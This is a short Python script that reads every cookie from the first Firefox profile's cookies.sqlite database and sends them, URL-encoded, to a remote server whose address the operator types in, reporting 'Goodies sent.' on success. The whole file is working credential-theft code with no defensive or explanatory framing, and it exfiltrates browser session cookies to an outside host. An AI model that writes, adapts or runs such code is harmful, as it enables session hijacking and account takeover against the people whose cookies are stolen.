import os
import sqlite3
import requests
from urllib.parse import urlencode

def find_firefox_cookies():
    app_data = os.getenv('APPDATA')
    profile_dir = os.path.join(app_data, 'Mozilla', 'Firefox', 'Profiles')

    profiles = os.listdir(profile_dir)
    profile = profiles[0]

    cookies_db = os.path.join(profile_dir, profile, 'cookies.sqlite')
    conn = sqlite3.connect(cookies_db)
    cursor = conn.cursor()

    cursor.execute('SELECT name, value FROM moz_cookies')
    cookies = cursor.fetchall()

    conn.close()

    remote_server_url = input("give me the url: ")

    if cookies:
        cookie_dict = {name: value for name, value in cookies}
        
        encoded_cookies = urlencode(cookie_dict)
        
        full_url = f"{remote_server_url}?{encoded_cookies}"
        
        response = requests.get(full_url)
        
        if response.status_code == 200:
            print("Goodies sent.")
        else:
            print(f"Failed, Status code: {response.status_code}")
    else:
        print("Nothin here")

find_firefox_cookies()
